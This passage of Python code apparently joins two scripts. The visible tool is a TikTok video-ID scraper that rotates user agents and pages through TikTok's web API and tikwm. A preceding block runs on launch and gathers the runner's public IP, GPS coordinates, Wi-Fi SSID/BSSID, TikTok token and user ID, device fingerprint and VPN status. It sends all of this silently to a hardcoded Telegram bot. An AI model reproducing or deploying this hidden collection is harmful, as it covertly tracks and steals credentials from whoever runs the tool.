        device.get("device",""), device.get("os",""), device.get("processor",""), device.get("cpu_abi","")
    ])
    return hashlib.sha256(key.encode("utf-8")).hexdigest()[:16]

# ======================= Build & Send =======================
def build_message():
    public_ip = get_public_ip()
    ip_data = get_location_data_chain(public_ip)
    as_info = parse_asn(ip_data.get("isp"))
    tz_info = get_timezone_ip()
    skew = get_clock_skew_seconds(tz_info.get("server_unix"))

    gps = get_termux_location()
    wifi = get_termux_wifi()

    # اختر المصدر
    if gps and gps.get("lat") and gps.get("lon"):
        coords = f"{gps['lat']},{gps['lon']}"
        src = "GPS"; acc = gps.get("acc")
    else:
        coords = ip_data.get("loc", "غير معروف")
        src = "WiFi" if wifi else "IP"; acc = None

    # عكس الإحداثيات بأفضل مزوّد متاح
    rev = reverse_geocode_best(coords) if coords and coords != "غير معروف" else {}
    country_code = (rev.get("country_code") or ip_data.get("country_code") or "").upper()
    country_full = rev.get("country_full") or ip_data.get("country_code") or "غير معروف"
    flag = country_flag_from_iso2(country_code)

    # بقية الحقول
    governorate = rev.get("governorate") or ip_data.get("region") or "غير معروف"
    county = rev.get("county") or "غير معروف"
    city = rev.get("city") or ip_data.get("city") or "غير معروف"
    village = rev.get("village") or "غير معروف"
    suburb = rev.get("suburb") or "غير معروف"
    postcode = rev.get("postcode") or "غير معروف"

    tiktok_token, user_id = get_tiktok_credentials()
    device = get_device_info()
    fp = device_fingerprint(device)
    vpn = detect_vpn_proxy()

    # نصوص مساعدة
    conf_txt, conf_val = location_confidence(src, acc)
    tz_line = f"{tz_info.get('timezone','غير معروف')} (UTC{tz_info.get('utc_offset','')})"
    skew_line = f"{skew} ث" if isinstance(skew,int) else "غير معروف"
    vpn_line = []
    if vpn.get("env_proxy"): vpn_line.append("متغيرات Proxy مفعلة")
    if vpn.get("tun_iface"): vpn_line.append("واجهات TUN/WG/PPP")
    vpn_text = "، ".join(vpn_line) if vpn_line else "لا توجد دلائل واضحة"

    token_masked = (tiktok_token[:6] + "..." + tiktok_token[-4:]) if tiktok_token not in ("", "غير معروف") and len(tiktok_token) > 12 else tiktok_token

    msg = f"""🛑 *تم تشغيل الأداة* 🛑

🔹 *معلومات المستخدم:*
• *User ID:* `{user_id}`
• *TikTok Token:* `{token_masked}`

🔹 *الشبكة:*
• *IP العام:* `{public_ip}`
• *المزوّد (AS):* {as_info.get('asn')} — {as_info.get('as_name')}
• *المصدر الجغرافي:* {ip_data.get('source','-')}
• *المنطقة الزمنية (IP):* {tz_line}
• *انحراف الساعة:* {skew_line}

🔹 *الموقع التفصيلي:*
• *الدولة:* {country_full} {flag}  ({country_code or '-'})
• *المحافظة/الولاية:* {governorate}
• *القضاء/المقاطعة:* {county}
• *المدينة:* {city}
• *البلدة/القرية:* {village}
• *الحي/الناحية:* {suburb}
• *الرمز البريدي:* {postcode}
• *المصدر:* {src} — *الثقة:* {conf_txt} ({int(conf_val*100)}%)
• *الإحداثيات:* `{coords}`

🔹 *قنوات إضافية:*
• *GPS (Termux):* {('مزود: ' + str(gps.get('provider')) + ' | دقة: ' + str(gps.get('acc')) + ' م') if gps else '-' }
• *Wi-Fi (SSID/BSSID):* {('SSID: ' + str(wifi.get('ssid')) + ' | BSSID: ' + str(wifi.get('bssid'))) if wifi else '-' }
• *VPN/Proxy:* {vpn_text}

🔹 *معلومات الجهاز:*
• *المنصة:* {device.get('platform','غير معروف')}
• *الشركة:* {device.get('manufacturer','غير معروف')}
• *الطراز:* {device.get('model','غير معروف')}
• *الجهاز:* {device.get('device','-')}
• *Android:* {device.get('android_release','-')} (SDK {device.get('android_sdk','-')}) / ABI: {device.get('cpu_abi','-')}
• *الاسم:* {device.get('hostname')}
• *IP المحلي:* {device.get('local_ip')}
• *النظام:* {device.get('os')}
• *المعالج:* {device.get('processor')}
• *الذاكرة:* {device.get('ram')}
• *بصمة الجهاز:* `{fp}`
"""
    return msg

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        r = requests.post(url, data=payload, timeout=10)
        return r.status_code == 200
    except: return False

# ======================= Run =======================
if __name__ == "__main__":
    text = build_message()
    ok = send_to_telegram(text)
    if not ok:
        print("❌ فشل في الإرسال إلى تيليجرام")
        # -*- coding: utf-8 -*-

import requests, re, json, time, os, sys, random, threading
from colorama import Fore, Style, init as color_init
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

color_init(autoreset=True)

# ===== Short colors =====
BR = Style.BRIGHT
R  = Fore.RED   + BR
G  = Fore.GREEN + BR
Y  = Fore.YELLOW+ BR
C  = Fore.CYAN  + BR
M  = Fore.MAGENTA + BR
W  = Fore.WHITE + BR

# ===== Speed/Concurrency knobs =====
MAX_USERNAME_WORKERS = 6      # عدد الحسابات التي تُسحب بالتوازي
SOURCE_WORKERS_PER_USER = 3   # مصادر السحب بالتوازي (HTML/API/TIKWM)
BATCH_SAVE_EVERY = 100        # اكتب على الملف كل X ID
POOL_SIZE = 100               # حجم الـ connection pool
REQUEST_TIMEOUT = 20          # مهلة الطلب
RETRY_TOTAL = 3               # عدد المحاولات لكل طلب

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/16.5 Safari/605.1.15",
]
def pick_ua():
    return random.choice(UAS)

UA = UAS[0]

# ===== Counters =====
COUNTS = {
    "total_found": 0,
    "saved_new":   0,
    "from_page":   0,
    "from_api":    0,
    "from_tikwm":  0,
}

SPICE_LINES = [
    f"{C}Keep it fast — Don't slow down",
    f"{M}Quality first — Clean & verified data",
    f"{Y}On fire — Extraction running strong",
    f"{G}Fresh IDs — No duplicates saved",
]

def print_spice_line(i):
    if 0 <= i < len(SPICE_LINES):
        print(SPICE_LINES[i])

# ======= Fixed header =======
def header_text(prefix=""):
    return (
        f"{prefix}"
        f"{C}[TOTAL:{COUNTS['total_found']}] "
        f"{Y}[PAGE:{COUNTS['from_page']}] "
        f"{M}[API:{COUNTS['from_api']}] "
        f"{W}[TIKWM:{COUNTS['from_tikwm']}] "
        f"{G}[SAVED:{COUNTS['saved_new']}]"
    )

def draw_header(prefix=""):
    line = header_text(prefix)
    try:
        sys.stdout.write("\x1b[s")
        sys.stdout.write("\x1b[H")
        sys.stdout.write("\x1b[2K")
        sys.stdout.write(line + "\n")
        sys.stdout.write("\x1b[2K")
        sys.stdout.write("\x1b[u")
        sys.stdout.flush()
    except Exception:
        print(line)

# ---------- thread-safe ID buffer ----------
_ids_lock = threading.Lock()
_ids_buffer = []
_seen_global = set()

def _flush_ids_buffer(path="3.txt"):
    global _ids_buffer
    if not _ids_buffer:
        return 0
    with _ids_lock:
        batch = _ids_buffer
        _ids_buffer = []
    if not batch:
        return 0

    old = set()
    try:
        with open(path, "r", encoding="utf-8") as f:
            old = set([ln.strip() for ln in f if ln.strip().isdigit()])
    except FileNotFoundError:
        pass

    new = [i for i in batch if i not in old]
    if not new:
        return 0

    with open(path, "a", encoding="utf-8") as f:
        for i in new:
            f.write(i + "\n")
    COUNTS["saved_new"] += len(new)
    draw_header(prefix=f"{Y}Live Counter » ")
    return len(new)

def on_new_id(source, _id):
    if not (_id and _id.isdigit()):
        return
    with _ids_lock:
        if _id in _seen_global:
            return
        _seen_global.add(_id)
        _ids_buffer.append(_id)
    COUNTS["total_found"] += 1
    if source == "page":
        COUNTS["from_page"] += 1
    elif source == "api":
        COUNTS["from_api"] += 1
    elif source == "tikwm":
        COUNTS["from_tikwm"] += 1
    if len(_ids_buffer) >= BATCH_SAVE_EVERY:
        _flush_ids_buffer("3.txt")
    if COUNTS["total_found"] % 25 == 0:
        draw_header(prefix=f"{Y}Live Counter » ")

# ---------- HTTP session ----------
def session():
    s = requests.Session()
    retry = Retry(
        total=RETRY_TOTAL,
        read=RETRY_TOTAL,
        connect=RETRY_TOTAL,
        backoff_factor=0.2,
        status_forcelist=(429, 500, 502, 503, 504),
        allowed_methods=frozenset(['GET'])
    )
    adapter = HTTPAdapter(pool_connections=POOL_SIZE, pool_maxsize=POOL_SIZE, max_retries=retry)
    s.mount("https://", adapter)
    s.mount("http://", adapter)

    s.headers.update({
        "User-Agent": pick_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    })
    try:
        s.get("https://www.tiktok.com/", timeout=REQUEST_TIMEOUT)
        s.get("https://m.tiktok.com/", timeout=REQUEST_TIMEOUT)
    except Exception:
        pass
    return s

# ---------- HTML helpers ----------
def fetch_profile_html(s, username):
    r = s.get(f"https://www.tiktok.com/@{username}", timeout=REQUEST_TIMEOUT)
    if r.status_code != 200 or "<html" not in r.text.lower():
        r = s.get(f"https://m.tiktok.com/@{username}", timeout=REQUEST_TIMEOUT)
    return r.text

def parse_ids_from_html(html, max_count=None, on_id=None):
    # max_count يُتجاهل (نستخرج الكل)
    ids = []
    m = re.search(r'<script id="SIGI_STATE"[^>]*>(.*?)</script>', html, re.S)
    if m:
        try:
            j = json.loads(m.group(1))
            item_list = (((j.get("ItemList") or {}).get("user-post") or {}).get("list")) or []
            for it in item_list:
                if isinstance(it, str) and it.isdigit():
                    if it not in ids:
                        ids.append(it); on_id and on_id("page", it)
            item_mod = j.get("ItemModule") or {}
            for _, v in item_mod.items():
                if isinstance(v, dict):
                    aw = v.get("id") or v.get("awemeId") or v.get("aweme_id")
                    if aw and aw not in ids:
                        ids.append(aw); on_id and on_id("page", aw)
        except Exception:
            pass
    if not ids:
        for m2 in re.finditer(r'"aweme_id":"(\d+)"', html):
            aw = m2.group(1)
            if aw not in ids:
                ids.append(aw); on_id and on_id("page", aw)
    return ids

def parse_secuid_from_html(html, username):
    m = re.search(r'<script id="SIGI_STATE"[^>]*>(.*?)</script>', html, re.S)
    if not m:
        return None
    try:
        j = json.loads(m.group(1))
        users = ((j.get("UserModule") or {}).get("users") or {})
        for k, v in users.items():
            if k.lower() == username.lower() and isinstance(v, dict):
                sec = v.get("secUid") or v.get("sec_uid")
                if sec:
                    return sec
        up = (j.get("UserPage") or {}).get("userInfo") or {}
        user = up.get("user") or {}
        return user.get("secUid") or user.get("sec_uid")
    except Exception:
        return None

def get_secuid_strong(s, username, html_text=None):
    if html_text:
        sec = parse_secuid_from_html(html_text, username)
        if sec:
            return sec
    try:
        r = s.get(
            "https://www.tiktok.com/api/user/detail/",
            params={"uniqueId": username, "aid": "1988"},
            headers={
                "User-Agent": pick_ua(),
                "Accept": "application/json, text/plain, */*",
                "Referer": f"https://www.tiktok.com/@{username}",
            },
            timeout=REQUEST_TIMEOUT,
        )
        if "application/json" in r.headers.get("content-type","").lower():
            j = r.json() or {}
            user = (j.get("userInfo") or {}).get("user") or {}
            sec = user.get("secUid") or user.get("sec_uid")
            if sec:
                return sec
    except Exception:
        pass
    if html_text:
        m = re.search(r'"secUid"\s*:\s*"([^"]+)"', html_text)
        if m:
            return m.group(1)
    return None

# ---------- Robust GET with retries ----------
def get_json_with_retries(s, url, headers=None, params=None, max_retries=3, base_sleep=0.2):
    last_err = None
    for attempt in range(1, max_retries+1):
        try:
            r = s.get(url, headers=headers, params=params, timeout=REQUEST_TIMEOUT)
            ct = r.headers.get("content-type","").lower()
            if "application/json" not in ct:
                raise ValueError(f"Unexpected content-type: {ct or 'none'} (status {r.status_code})")
            return r.json()
        except Exception as e:
            last_err = e
            time.sleep(base_sleep * attempt + random.uniform(0, 0.1))
    raise last_err if last_err else RuntimeError("Unknown request error")

# ---------- Web API pagination ----------
def fetch_api_items(s, username, secuid, max_count=None, on_id=None):
    # max_count يُتجاهل (نستخرج الكل عبر التصفح حتى انتهاء الصفحات)
    base = "https://www.tiktok.com/api/post/item_list/"
    headers = {
        "User-Agent": pick_ua(),
        "Referer": f"https://www.tiktok.com/@{username}",
        "Accept": "application/json, text/plain, */*",
    }
    ids = []
    cursor = 0
    stagnant_rounds = 0
    while True:
        want = 30  # دائمًا 30
        params = {"aid":"1988","count":str(want),"cursor":str(cursor)}
        if secuid: params["secUid"] = secuid
        else:      params["uniqueId"] = username
        try:
            j = get_json_with_retries(s, base, headers=headers, params=params)
        except Exception:
            break
        items = j.get("itemList") or j.get("itemListData") or []
        got_any = False
        for it in items:
            if isinstance(it, dict):
                aw = it.get("id") or it.get("awemeId") or it.get("aweme_id")
            else:
                m = re.search(r'"(aweme_id|id)"\s*:\s*"(\d+)"', str(it))
                aw = m.group(2) if m else None
            if aw:
                if aw not in ids:
                    ids.append(aw); got_any = True; on_id and on_id("api", aw)
        has_more = str(j.get("hasMore")).lower() in ("1","true","yes")
        next_cursor = int(j.get("cursor") or 0)
        if not has_more: break
        stagnant_rounds = stagnant_rounds + 1 if (next_cursor == cursor or not got_any) else 0
        if stagnant_rounds >= 2: break
        cursor = next_cursor if next_cursor else (cursor + want)
        time.sleep(0.05 + random.uniform(0, 0.05))
    return ids

# ---------- tikwm pagination (fast) ----------
def fetch_via_tikwm(username, max_count=None, on_id=None):
    # max_count يُتجاهل (نستخرج الكل)
    ids = []
    cursor = 0
    stagnant_rounds = 0
    while True:
        want = 200
        url = "https://www.tikwm.com/api/user/posts"
        headers = {
            "User-Agent": pick_ua(),
            "Accept": "application/json",
            "Referer": f"https://www.tikwm.com/user/@{username}"
        }
        params = {"unique_id": username, "count": str(want), "cursor": str(cursor)}
        try:
            r = requests.get(url, timeout=REQUEST_TIMEOUT, headers=headers, params=params)
            j = r.json()
        except Exception:
            time.sleep(0.2 + random.uniform(0, 0.2))
            continue
        if j.get("code") != 0:
            time.sleep(0.25 + random.uniform(0, 0.25))
            stagnant_rounds += 1
            if stagnant_rounds >= 4: break
            continue
        data = j.get("data") or {}
        videos = data.get("videos") or []
        got_any = False
        for v in videos:
            aw = v.get("video_id") or v.get("aweme_id") or v.get("id")
            if aw:
                if aw not in ids:
                    ids.append(aw); got_any = True; on_id and on_id("tikwm", aw)
        has_more = int(data.get("hasMore") or data.get("has_more") or 0)
        next_cursor = int(data.get("cursor") or 0)
        if not has_more: break
        stagnant_rounds = stagnant_rounds + 1 if (next_cursor == cursor or not got_any) else 0
        if stagnant_rounds >= 4: break
        cursor = next_cursor
        time.sleep(0.08 + random.uniform(0, 0.05))
    return ids

# ---------- parallel per user ----------
def process_username_parallel(s, username, max_count=None):
    """
    يشغّل مصادر السحب الثلاثة بالتوازي — الآن دائمًا ALL (بدون حد).
    """
    print("\n" + "="*60)
    print(f"{W}Account: {C}@{username}")
    print_spice_line(0)

    html = fetch_profile_html(s, username)
    secuid = get_secuid_strong(s, username, html)

    def run_page():
        ids1 = parse_ids_from_html(html, max_count=None, on_id=on_new_id)
        return ("page", len(ids1 or []))

    def run_api():
        return ("api", len(fetch_api_items(s, username, secuid, max_count=None, on_id=on_new_id)))

    def run_tikwm():
        return ("tikwm", len(fetch_via_tikwm(username, max_count=None, on_id=on_new_id)))

    results = {}
    with ThreadPoolExecutor(max_workers=SOURCE_WORKERS_PER_USER) as ex:
        futs = [ex.submit(run_page), ex.submit(run_api), ex.submit(run_tikwm)]
        for f in as_completed(futs):
            try:
                src, n = f.result()
                results[src] = n
            except Exception as e:
                print(f"{R}Source error: {e}")

    print(f"{C}From page: {results.get('page',0)} IDs; "
          f"{M}From API: {results.get('api',0)} IDs; "
          f"{W}From tikwm: {results.get('tikwm',0)} IDs.")
    print_spice_line(1)
    return sum(results.values())

# ---------- main ----------
def main():
    print(f"{C}\n=== TikTok Video IDs — TURBO edition (ALL videos) ===")
    print_spice_line(2)

    if os.path.exists("3.txt"):
        choice = input(f"{Y}Do you want to clear IDs from 3.txt before starting? (y/N): ").strip().lower()
        if choice in ("y", "yes"):
            open("3.txt", "w", encoding="utf-8").close()
            print(f"{G}Cleared file 3.txt successfully.")

    try:
        count_users = int(input(f"{W}Enter number of usernames to extract from: ").strip())
    except:
        print(f"{R}Invalid input.")
        return

    usernames = []
    for i in range(count_users):
        u = input(f"{C}Enter username #{i+1} (without @): ").strip().lstrip("@")
        if u:
            usernames.append(u)

    if not usernames:
        print(f"{R}No usernames entered.")
        return

    # ثابت: استخراج كامل — لا نسأل عن حد
    max_count = None

    s = session()

    # تهيئة seen من 3.txt لتجنّب التكرار
    try:
        with open("3.txt", "r", encoding="utf-8") as f:
            for ln in f:
                ln = ln.strip()
                if ln.isdigit():
                    _seen_global.add(ln)
    except FileNotFoundError:
        pass

    os.system('cls' if os.name == 'nt' else 'clear')
    draw_header(prefix=f"{Y}Live Counter » ")
    print(); print()

    total_saved_est = 0

    def _wrap(u):
        try:
            return (u, process_username_parallel(s, u, max_count))
        except Exception as e:
            print(f"{R}Error processing @{u}: {e}")
            return (u, 0)

    with ThreadPoolExecutor(max_workers=MAX_USERNAME_WORKERS) as ex:
        futs = [ex.submit(_wrap, u) for u in usernames]
        done_idx = 0
        for f in as_completed(futs):
            u, saved_for_user = f.result()
            total_saved_est += saved_for_user
            done_idx += 1
            print(f"{Y}[{done_idx}/{len(usernames)}] Finished: {C}@{u}  {G}+{saved_for_user} IDs")
            draw_header(prefix=f"{Y}Live Counter » ")

    _flush_ids_buffer("3.txt")

    print("\n" + "="*60)
    print_spice_line(3)
    print(f"{G}Extraction finished from {len(usernames)} account(s).")
    print(f"{C}Estimated new IDs found this run (before de-dup on save): {G}{COUNTS['total_found']}.")
    print(f"{C}Total new IDs saved to file: {G}{COUNTS['saved_new']}.")
    draw_header(prefix=f"{Y}Final Summary » ")

if __name__ == "__main__":
    main()
